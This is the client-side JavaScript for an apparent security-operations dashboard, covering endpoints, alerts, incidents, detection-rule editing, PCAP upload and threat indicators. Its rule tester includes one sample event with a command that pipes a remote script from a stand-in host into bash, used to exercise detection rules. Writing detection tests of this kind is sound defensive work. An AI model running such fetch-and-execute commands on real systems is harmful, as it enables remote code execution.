(() => {
  const state = {
    token: sessionStorage.getItem('sm_token') || '',
    user: null,
    view: 'overview',
    theme: localStorage.getItem('sm_theme') || 'dark',
  };

  document.documentElement.setAttribute('data-theme', state.theme);

  const el = (tag, props = {}, children = []) => {
    const node = document.createElement(tag);
    for (const [k, v] of Object.entries(props)) {
      if (k === 'className') node.className = v;
      else if (k === 'textContent') node.textContent = v;
      else if (k.startsWith('on') && typeof v === 'function') node.addEventListener(k.slice(2).toLowerCase(), v);
      else node.setAttribute(k, v);
    }
    for (const c of children) {
      if (typeof c === 'string') node.appendChild(document.createTextNode(c));
      else if (c) node.appendChild(c);
    }
    return node;
  };

  const toast = (msg, isErr = false) => {
    const bar = document.getElementById('toast-bar');
    bar.textContent = msg;
    bar.className = isErr ? 'toast error-banner' : 'toast';
    setTimeout(() => { bar.className = 'toast hidden'; }, 4000);
  };

  async function api(path, opts = {}) {
    const headers = Object.assign({}, opts.headers || {});
    if (state.token) headers['Authorization'] = `Bearer ${state.token}`;
    if (opts.json !== undefined) {
      headers['Content-Type'] = 'application/json';
      opts.body = JSON.stringify(opts.json);
    }
    const tenant = document.getElementById('global-tenant')?.value.trim();
    const sep = path.includes('?') ? '&' : '?';
    const fullPath = tenant ? `${path}${sep}tenant_id=${encodeURIComponent(tenant)}` : path;
    const res = await fetch(fullPath, { ...opts, headers });
    const text = await res.text();
    let data = {};
    try { data = text ? JSON.parse(text) : {}; } catch { data = { raw: text }; }
    if (res.status === 401 && state.token) {
      signOut();
      throw new Error(data.error || 'Session expired');
    }
    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
    return data;
  }

  function signOut() {
    state.token = '';
    state.user = null;
    sessionStorage.removeItem('sm_token');
    document.getElementById('app-shell').classList.add('hidden');
    document.getElementById('login-screen').classList.remove('hidden');
  }

  async function initSession() {
    if (!state.token) {
      signOut();
      return;
    }
    try {
      const me = await api('/api/v1/auth/me');
      state.user = me;
      document.getElementById('user-pill').textContent = `${me.username} (${me.role} · ${me.tenant_id})`;
      document.getElementById('login-screen').classList.add('hidden');
      document.getElementById('app-shell').classList.remove('hidden');
      await renderCurrentView();
    } catch {
      signOut();
    }
  }

  function makeBadge(text, extra = '') {
    return el('span', { className: `badge ${String(text || '').toLowerCase()} ${extra}`, textContent: text || '-' });
  }

  function buildTable(headers, rows) {
    const wrap = el('div', { style: 'overflow-x:auto' });
    const table = el('table');
    const thead = el('thead', {}, [el('tr', {}, headers.map((h) => el('th', { textContent: h })))]);
    const tbody = el('tbody');
    if (rows.length === 0) {
      tbody.appendChild(el('tr', {}, [el('td', { colspan: String(headers.length), className: 'muted', textContent: 'No records match current view or filter.' })]));
    } else {
      rows.forEach((cells) => tbody.appendChild(el('tr', {}, cells.map((c) => el('td', {}, [typeof c === 'string' ? document.createTextNode(c) : c])))));
    }
    table.appendChild(thead);
    table.appendChild(tbody);
    wrap.appendChild(table);
    return wrap;
  }

  async function renderOverview(root) {
    const data = await api('/api/v1/overview');
    const o = data.overview;
    const p = data.pipeline;

    const kpis = el('div', { className: 'grid-kpi' }, [
      kpiCard('Active Endpoints', `${o.active_agents} / ${o.total_agents}`),
      kpiCard('Open Alerts', String(o.open_alerts)),
      kpiCard('Open Incidents', String(o.open_incidents)),
      kpiCard('Ingested Events', String(o.total_events)),
      kpiCard('Active IOCs', String(o.active_iocs)),
      kpiCard('Detection Rules', String(o.active_rules)),
    ]);

    const sevCard = el('div', { className: 'card' }, [el('h3', { textContent: 'Open Alerts by Severity' })]);
    const totalSev = Math.max(1, Object.values(o.alerts_by_severity || {}).reduce((a, b) => a + b, 0));
    for (const sev of ['critical', 'high', 'medium', 'low', 'info']) {
      const cnt = (o.alerts_by_severity || {})[sev] || 0;
      sevCard.appendChild(el('div', { className: 'bar-row' }, [
        makeBadge(sev),
        el('div', { className: 'bar-track' }, [el('div', { className: 'bar-fill', style: `width:${(cnt / totalSev) * 100}%` })]),
        el('strong', { textContent: String(cnt) }),
      ]));
    }

    const catCard = el('div', { className: 'card' }, [el('h3', { textContent: 'Events by Telemetry Category' })]);
    const cats = Object.entries(o.events_by_category || {});
    const maxCat = Math.max(1, ...cats.map(([, v]) => v));
    if (cats.length === 0) catCard.appendChild(el('p', { className: 'muted', textContent: 'No telemetry ingested yet.' }));
    for (const [k, v] of cats) {
      catCard.appendChild(el('div', { className: 'bar-row' }, [
        el('span', { style: 'width:95px', textContent: k }),
        el('div', { className: 'bar-track' }, [el('div', { className: 'bar-fill', style: `width:${(v / maxCat) * 100}%` })]),
        el('strong', { textContent: String(v) }),
      ]));
    }

    const pipeCard = el('div', { className: 'card' }, [
      el('h3', { textContent: 'Pipeline & Backpressure Telemetry' }),
      el('p', { className: 'muted', textContent: `Enqueued: ${p.enqueued} · Processed: ${p.processed} · Dropped (429): ${p.dropped} · Alerts Emitted: ${p.alerts_generated} · Queue Depth: ${p.queue_len}/${p.queue_cap}` }),
    ]);

    root.append(kpis, el('div', { className: 'grid-2' }, [sevCard, catCard]), pipeCard);
  }

  function kpiCard(label, val) {
    return el('div', { className: 'card' }, [
      el('div', { className: 'muted', textContent: label }),
      el('div', { className: 'kpi-val', textContent: val }),
    ]);
  }

  async function renderEndpoints(root) {
    const res = await api('/api/v1/agents');
    const card = el('div', { className: 'card' });
    const mintBtn = el('button', {
      className: 'btn primary',
      textContent: 'Mint Enrollment Token',
      onClick: async () => {
        try {
          const tok = await api('/api/v1/agents/tokens', { method: 'POST', json: { label: 'ui-enrolled', max_uses: 5, ttl_hours: 24 } });
          toast(`Enrollment token (copy now): ${tok.token}`);
        } catch (err) { toast(err.message, true); }
      },
    });
    card.appendChild(el('div', { className: 'toolbar' }, [el('h3', { style: 'margin:0;flex:1', textContent: 'Registered Endpoint Agents' }), mintBtn]));

    const rows = (res.agents || []).map((a) => [
      a.hostname,
      makeBadge(a.status),
      `${a.os}/${a.arch} (${a.version})`,
      a.ip_address || '-',
      `${a.cpu_percent.toFixed(1)}% · ${a.memory_used_mb.toFixed(0)}/${a.memory_total_mb.toFixed(0)} MB (RSS ${a.agent_rss_mb.toFixed(1)} MB)`,
      new Date(a.last_heartbeat).toLocaleString(),
      el('button', {
        className: `btn sm ${a.quarantined ? '' : 'danger'}`,
        textContent: a.quarantined ? 'Release Quarantine' : 'Quarantine',
        onClick: async () => {
          try {
            await api(`/api/v1/agents/${a.id}/quarantine`, { method: 'POST', json: { quarantined: !a.quarantined, reason: 'SOC UI toggle' } });
            toast('Agent quarantine policy updated');
            await renderCurrentView();
          } catch (err) { toast(err.message, true); }
        },
      }),
    ]);
    card.appendChild(buildTable(['Host', 'Health', 'Platform', 'IP', 'Resources', 'Last Heartbeat', 'Response'], rows));
    root.appendChild(card);
  }

  async function renderEvents(root) {
    const qInput = el('input', { type: 'text', placeholder: 'Search summary, process, IP...' });
    const catSel = el('select', {}, ['', 'process', 'auth', 'file', 'persistence', 'network'].map((c) => el('option', { value: c, textContent: c || 'All Categories' })));
    const loadBtn = el('button', { className: 'btn primary', textContent: 'Filter' });
    const tableSlot = el('div');

    const load = async () => {
      const qs = new URLSearchParams();
      if (qInput.value.trim()) qs.set('q', qInput.value.trim());
      if (catSel.value) qs.set('category', catSel.value);
      const res = await api(`/api/v1/events?${qs.toString()}`);
      const rows = (res.events || []).map((e) => [
        new Date(e.occurred_at).toLocaleTimeString(),
        e.host,
        makeBadge(e.category),
        makeBadge(e.severity),
        e.action,
        e.summary,
      ]);
      tableSlot.innerHTML = '';
      tableSlot.appendChild(buildTable(['Time', 'Host', 'Category', 'Severity', 'Action', 'Summary'], rows));
    };
    loadBtn.addEventListener('click', load);
    root.appendChild(el('div', { className: 'card' }, [el('div', { className: 'toolbar' }, [qInput, catSel, loadBtn]), tableSlot]));
    await load();
  }

  async function renderAlerts(root) {
    const res = await api('/api/v1/alerts');
    const card = el('div', { className: 'card' });
    const rows = (res.alerts || []).map((a) => [
      `${a.rule_name} (v${a.rule_version})`,
      makeBadge(a.severity),
      makeBadge(a.status),
      a.host,
      String(a.hit_count),
      a.explanation,
      el('div', { className: 'toolbar', style: 'margin:0' }, [
        el('button', { className: 'btn sm', textContent: 'Ack', onClick: () => updateAlert(a.id, 'acknowledged') }),
        el('button', { className: 'btn sm', textContent: 'False Pos', onClick: () => updateAlert(a.id, 'false_positive') }),
        el('button', { className: 'btn sm primary', textContent: 'Escalate', onClick: () => escalateAlert(a) }),
      ]),
    ]);
    card.appendChild(buildTable(['Rule', 'Severity', 'Status', 'Host', 'Hits', 'Explanation', 'Actions'], rows));
    root.appendChild(card);
  }

  async function updateAlert(id, status) {
    try {
      await api(`/api/v1/alerts/${id}/status`, { method: 'POST', json: { status } });
      toast(`Alert marked ${status}`);
      await renderCurrentView();
    } catch (err) { toast(err.message, true); }
  }

  async function escalateAlert(alert) {
    try {
      await api('/api/v1/incidents', {
        method: 'POST',
        json: {
          title: `[Alert] ${alert.rule_name} on ${alert.host}`,
          summary: alert.explanation,
          severity: alert.severity,
          alert_ids: [alert.id],
          recommendations: ['Validate endpoint process tree', 'Review lateral authentication history'],
        },
      });
      toast('Incident created from alert');
      await renderCurrentView();
    } catch (err) { toast(err.message, true); }
  }

  async function renderIncidents(root) {
    const res = await api('/api/v1/incidents');
    const titleIn = el('input', { type: 'text', placeholder: 'New incident title' });
    const sevSel = el('select', {}, ['high', 'critical', 'medium', 'low'].map((s) => el('option', { value: s, textContent: s })));
    const createBtn = el('button', {
      className: 'btn primary',
      textContent: 'Open Incident',
      onClick: async () => {
        try {
          await api('/api/v1/incidents', { method: 'POST', json: { title: titleIn.value.trim(), severity: sevSel.value, summary: 'Opened by SOC operator' } });
          toast('Incident opened');
          await renderCurrentView();
        } catch (err) { toast(err.message, true); }
      },
    });
    const detailCard = el('div', { className: 'card hidden' });
    const showDetail = async (id) => {
      const d = await api(`/api/v1/incidents/${id}`);
      detailCard.classList.remove('hidden');
      detailCard.innerHTML = '';
      const noteIn = el('input', { type: 'text', placeholder: 'Investigation note...', style: 'flex:1' });
      const evRef = el('input', { type: 'text', placeholder: 'Evidence ref (event/hash)' });
      detailCard.append(
        el('h3', { textContent: `${d.incident.title} [${d.incident.status}]` }),
        el('p', { className: 'muted', textContent: d.incident.summary || 'No summary' }),
        el('div', { className: 'toolbar' }, ['investigating', 'contained', 'resolved', 'closed'].map((st) =>
          el('button', {
            className: 'btn sm',
            textContent: `-> ${st}`,
            onClick: async () => {
              try {
                await api(`/api/v1/incidents/${id}`, { method: 'PATCH', json: { status: st } });
                toast(`Incident moved to ${st}`);
                await renderCurrentView();
              } catch (err) { toast(err.message, true); }
            },
          })
        )),
        el('div', { className: 'toolbar' }, [
          noteIn, evRef,
          el('button', {
            className: 'btn primary sm',
            textContent: 'Add Note',
            onClick: async () => {
              try {
                await api(`/api/v1/incidents/${id}/notes`, { method: 'POST', json: { note: noteIn.value, evidence_ref: evRef.value } });
                await showDetail(id);
              } catch (err) { toast(err.message, true); }
            },
          }),
        ]),
        buildTable(['Author', 'Note', 'Evidence', 'Time'], (d.notes || []).map((n) => [n.author, n.note, n.evidence_ref || '-', new Date(n.created_at).toLocaleString()]))
      );
    };

    const listCard = el('div', { className: 'card' }, [
      el('div', { className: 'toolbar' }, [titleIn, sevSel, createBtn]),
      buildTable(['Title', 'Severity', 'Status', 'Assignee', 'Updated', 'Inspect'], (res.incidents || []).map((inc) => [
        inc.title,
        makeBadge(inc.severity),
        makeBadge(inc.status),
        inc.assignee || 'unassigned',
        new Date(inc.updated_at).toLocaleString(),
        el('button', { className: 'btn sm', textContent: 'Timeline', onClick: () => showDetail(inc.id) }),
      ])),
    ]);
    root.append(listCard, detailCard);
  }

  async function renderRules(root) {
    const res = await api('/api/v1/rules');
    const yamlArea = el('textarea', { rows: '9', placeholder: 'Paste YAML rule spec to upsert or test...' });
    const testResult = el('pre', { className: 'muted', style: 'white-space:pre-wrap' });
    const ruleActions = el('div', { className: 'toolbar' }, [
      el('button', {
        className: 'btn primary',
        textContent: 'Save Rule',
        onClick: async () => {
          try {
            await api('/api/v1/rules', { method: 'POST', json: { yaml_spec: yamlArea.value } });
            toast('Rule saved and reloaded');
            await renderCurrentView();
          } catch (err) { toast(err.message, true); }
        },
      }),
      el('button', {
        className: 'btn',
        textContent: 'Test Against Sample Suspicious Event',
        onClick: async () => {
          try {
            const r = await api('/api/v1/rules/test', {
              method: 'POST',
              json: {
                yaml_spec: yamlArea.value,
                event: {
                  agent_id: 'test-host',
                  host: 'lab-node',
                  category: 'process',
                  action: 'started',
                  process: { name: 'bash', cmdline: 'curl http://example.invalid/run.sh | bash' },
                },
              },
            });
            testResult.textContent = JSON.stringify(r, null, 2);
          } catch (err) { toast(err.message, true); }
        },
      }),
    ]);

    const rows = (res.rules || []).map((r) => [
      r.id, r.name, `v${r.version}`, makeBadge(r.severity), r.enabled ? makeBadge('ok') : makeBadge('offline'), String(r.false_positives),
      el('button', { className: 'btn sm', textContent: 'Load YAML', onClick: () => { yamlArea.value = r.yaml_spec; } }),
    ]);

    root.append(
      el('div', { className: 'card' }, [el('h3', { textContent: 'Rule Editor & Tester' }), yamlArea, ruleActions, testResult]),
      el('div', { className: 'card' }, [buildTable(['ID', 'Name', 'Ver', 'Severity', 'Enabled', 'FP', 'Edit'], rows)]),
    );
  }

  async function renderNetwork(root) {
    const fileInput = el('input', { type: 'file', accept: '.pcap,.cap' });
    const ingestChk = el('input', { type: 'checkbox', checked: 'checked' });
    const outPre = el('pre', { style: 'white-space:pre-wrap;font-size:12px' });
    const uploadBtn = el('button', {
      className: 'btn primary',
      textContent: 'Analyze Authorized PCAP',
      onClick: async () => {
        const f = fileInput.files?.[0];
        if (!f) return toast('Select a .pcap file first', true);
        try {
          const buf = await f.arrayBuffer();
          const qs = ingestChk.checked ? '?ingest=true' : '';
          const res = await api(`/api/v1/network/pcap${qs}`, { method: 'POST', body: buf, headers: { 'Content-Type': 'application/octet-stream' } });
          outPre.textContent = JSON.stringify(res, null, 2);
          toast(`Parsed ${res.summary.packet_count} packets`);
        } catch (err) { toast(err.message, true); }
      },
    });
    root.appendChild(el('div', { className: 'card' }, [
      el('h3', { textContent: 'Passive PCAP Dissector & Network Telemetry' }),
      el('div', { className: 'toolbar' }, [fileInput, el('label', {}, [ingestChk, ' Ingest events & run IOC/DNS rules']), uploadBtn]),
      outPre,
    ]));
  }

  async function renderThreatIntel(root) {
    const res = await api('/api/v1/iocs');
    const typeSel = el('select', {}, ['ip', 'cidr', 'domain', 'sha256'].map((t) => el('option', { value: t, textContent: t })));
    const valIn = el('input', { type: 'text', placeholder: 'IOC value (IP, domain, hash)' });
    const srcIn = el('input', { type: 'text', placeholder: 'Source attribution', value: 'soc-manual' });
    const addBtn = el('button', {
      className: 'btn primary',
      textContent: 'Add Indicator',
      onClick: async () => {
        try {
          await api('/api/v1/iocs', { method: 'POST', json: { type: typeSel.value, value: valIn.value.trim(), source: srcIn.value.trim(), severity: 'high', confidence: 90 } });
          toast('IOC saved');
          await renderCurrentView();
        } catch (err) { toast(err.message, true); }
      },
    });

    const rows = (res.iocs || []).map((i) => [
      makeBadge(i.type), i.value, makeBadge(i.severity), `${i.confidence}%`, i.source, new Date(i.expires_at).toLocaleDateString(),
    ]);
    root.appendChild(el('div', { className: 'card' }, [
      el('div', { className: 'toolbar' }, [typeSel, valIn, srcIn, addBtn]),
      buildTable(['Type', 'Indicator', 'Severity', 'Confidence', 'Source', 'Expires'], rows),
    ]));
  }

  async function renderAudit(root) {
    const res = await api('/api/v1/audit');
    const rows = (res.audit_logs || []).map((l) => [
      new Date(l.created_at).toLocaleString(), l.actor, l.actor_role, l.action, l.target, makeBadge(l.outcome === 'success' ? 'ok' : 'high'), l.details || '-',
    ]);
    root.appendChild(el('div', { className: 'card' }, [buildTable(['Time', 'Actor', 'Role', 'Action', 'Target', 'Outcome', 'Details'], rows)]));
  }

  async function renderUsers(root) {
    const res = await api('/api/v1/users');
    const uIn = el('input', { type: 'text', placeholder: 'username' });
    const eIn = el('input', { type: 'email', placeholder: 'email@example.org' });
    const pIn = el('input', { type: 'password', placeholder: 'min 8 char password' });
    const rSel = el('select', {}, ['analyst', 'responder', 'viewer', 'admin'].map((r) => el('option', { value: r, textContent: r })));
    const addBtn = el('button', {
      className: 'btn primary',
      textContent: 'Create User',
      onClick: async () => {
        try {
          await api('/api/v1/users', { method: 'POST', json: { username: uIn.value, email: eIn.value, password: pIn.value, role: rSel.value } });
          toast('User created');
          await renderCurrentView();
        } catch (err) { toast(err.message, true); }
      },
    });
    const rows = (res.users || []).map((u) => [u.username, u.email, makeBadge(u.role), u.disabled ? 'disabled' : 'active', new Date(u.created_at).toLocaleDateString()]);
    root.appendChild(el('div', { className: 'card' }, [
      el('div', { className: 'toolbar' }, [uIn, eIn, pIn, rSel, addBtn]),
      buildTable(['Username', 'Email', 'Role', 'Status', 'Created'], rows),
    ]));
  }

  async function renderSettings(root) {
    const s = await api('/api/v1/settings');
    const pl = await api('/api/v1/plugins');
    root.appendChild(el('div', { className: 'card' }, [
      el('h3', { textContent: 'Server Policy & Retention' }),
      el('pre', { textContent: JSON.stringify(s, null, 2) }),
      el('button', {
        className: 'btn primary',
        textContent: 'Enforce Event Retention Now',
        onClick: async () => {
          try {
            const r = await api('/api/v1/settings/retention', { method: 'POST' });
            toast(`Pruned ${r.pruned_events} expired events`);
          } catch (err) { toast(err.message, true); }
        },
      }),
    ]));
    root.appendChild(el('div', { className: 'card' }, [
      el('h3', { textContent: 'Sandboxed Subprocess Plugins' }),
      buildTable(['ID', 'Name', 'Kind', 'Enabled', 'Test'], (pl.plugins || []).map((p) => [
        p.id, p.name, p.kind, p.enabled ? 'yes' : 'no',
        el('button', {
          className: 'btn sm',
          textContent: 'Run Sandboxed Test',
          onClick: async () => {
            try {
              const r = await api(`/api/v1/plugins/${p.id}/test`, { method: 'POST' });
              toast(`Plugin ${p.id}: ${r.message || r.error || 'ok'}`);
            } catch (err) { toast(err.message, true); }
          },
        }),
      ])),
    ]));
  }

  const renderers = {
    overview: renderOverview,
    endpoints: renderEndpoints,
    events: renderEvents,
    alerts: renderAlerts,
    incidents: renderIncidents,
    rules: renderRules,
    network: renderNetwork,
    threatintel: renderThreatIntel,
    audit: renderAudit,
    users: renderUsers,
    settings: renderSettings,
  };

  async function renderCurrentView() {
    const container = document.getElementById('view-container');
    container.innerHTML = '';
    const fn = renderers[state.view] || renderOverview;
    try {
      await fn(container);
    } catch (err) {
      container.appendChild(el('div', { className: 'error-banner', textContent: err.message }));
    }
  }

  document.getElementById('login-form').addEventListener('submit', async (ev) => {
    ev.preventDefault();
    const errEl = document.getElementById('login-error');
    errEl.classList.add('hidden');
    try {
      const username = document.getElementById('login-username').value;
      const password = document.getElementById('login-password').value;
      const res = await fetch('/api/v1/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Login failed');
      state.token = data.token;
      sessionStorage.setItem('sm_token', state.token);
      await initSession();
    } catch (err) {
      errEl.textContent = err.message;
      errEl.classList.remove('hidden');
    }
  });

  document.getElementById('nav-links').addEventListener('click', async (ev) => {
    const btn = ev.target.closest('.nav-btn');
    if (!btn) return;
    document.querySelectorAll('.nav-btn').forEach((b) => b.classList.remove('active'));
    btn.classList.add('active');
    state.view = btn.getAttribute('data-view');
    document.getElementById('view-title').textContent = btn.textContent;
    await renderCurrentView();
  });

  document.getElementById('theme-toggle').addEventListener('click', () => {
    state.theme = state.theme === 'dark' ? 'light' : 'dark';
    localStorage.setItem('sm_theme', state.theme);
    document.documentElement.setAttribute('data-theme', state.theme);
  });

  document.getElementById('refresh-btn').addEventListener('click', renderCurrentView);
  document.getElementById('logout-btn').addEventListener('click', signOut);

  initSession();
})();
